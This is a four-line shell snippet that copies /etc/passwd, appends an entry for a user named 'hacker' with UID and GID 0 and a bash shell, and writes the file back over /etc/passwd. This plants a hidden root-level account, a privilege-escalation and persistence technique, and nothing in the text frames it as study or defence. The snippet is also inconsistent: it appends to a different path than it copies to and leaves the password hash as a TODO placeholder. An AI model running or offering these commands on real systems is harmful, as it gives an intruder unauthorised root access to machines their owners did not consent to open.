cp /etc/passwd /tmp/passwd
$HASH=TODO
echo "hacker:hash:0:0:Ubuntu,,,:/home/hacker:/bin/bash" >> passwd
mv passwd /etc/passwd
